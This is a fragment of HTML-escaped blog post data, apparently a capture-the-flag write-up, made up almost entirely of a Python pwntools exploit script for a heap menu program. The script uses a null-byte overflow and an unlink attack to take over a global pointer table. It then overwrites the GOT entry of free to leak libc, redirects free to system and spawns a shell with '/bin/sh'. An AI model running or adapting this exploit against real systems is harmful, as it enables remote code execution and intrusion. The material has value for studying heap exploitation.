class=\"line\"></div><div class=\"line\">def init(size):</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;1&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;length:&apos;)</div><div class=\"line\">\tio.sendline(str(size))</div><div class=\"line\">\tio.recvuntil(&apos;Done~&apos;)</div><div class=\"line\"></div><div class=\"line\">def edit(index,content):</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;2&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(&apos;content:&apos;)</div><div class=\"line\">\tio.sendline(str(content))</div><div class=\"line\">\tio.recvuntil(&apos;Done~&apos;)</div><div class=\"line\"></div><div class=\"line\">def delete(index):</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;3&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(&apos;Done~&apos;)</div><div class=\"line\"></div><div class=\"line\">def leak(dst):</div><div class=\"line\">\tedit(1,p64(dst)+p64(SIZE)[:-1])</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;3&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(&apos;0&apos;)</div><div class=\"line\">\tleakmem = io.recvuntil(&quot;Done~&quot;)[:-6]</div><div class=\"line\">\treturn str(leakmem)</div><div class=\"line\"></div><div class=\"line\">def main():</div><div class=\"line\"></div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\"></div><div class=\"line\">\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+&apos;A&apos;*0xd0+p64(0xf0)</div><div class=\"line\">\t# overflow null byte</div><div class=\"line\">\tedit(2,payload)</div><div class=\"line\">        # gdb.attach(io,execute=(&quot;b *%s&quot;%(0x400CCF)))</div><div class=\"line\">\tdelete(3)</div><div class=\"line\">        </div><div class=\"line\">\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class=\"line\">\tedit(2,payload2)</div><div class=\"line\"></div><div class=\"line\">\t# modify GOT entry of free to PLT entry of puts</div><div class=\"line\">\t# use [:1] to prevent \\x00 from causing damage</div><div class=\"line\">\tedit(2,p64(PLT_puts)[:-1])</div><div class=\"line\"></div><div class=\"line\">\t# leak read_addr</div><div class=\"line\">\tread_addr=u64(leak(GOT_read).ljust(8,&apos;\\x00&apos;))</div><div class=\"line\">\tprint &quot;read_addr: &quot;+str(hex(read_addr))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\tsystem_addr=read_addr-0x980C0</div><div class=\"line\">\t# system_addr= read_addr-0xeb6a0 +0x46590</div><div class=\"line\">\t</div><div class=\"line\">\t# modify free to system</div><div class=\"line\">\tedit(2,p64(system_addr)[:-1])</div><div class=\"line\">\tedit(4,&quot;/bin/sh&quot;)</div><div class=\"line\">\t</div><div class=\"line\">\t# now get shell</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;3&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(&apos;4&apos;)</div><div class=\"line\"></div><div class=\"line\">\tio.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}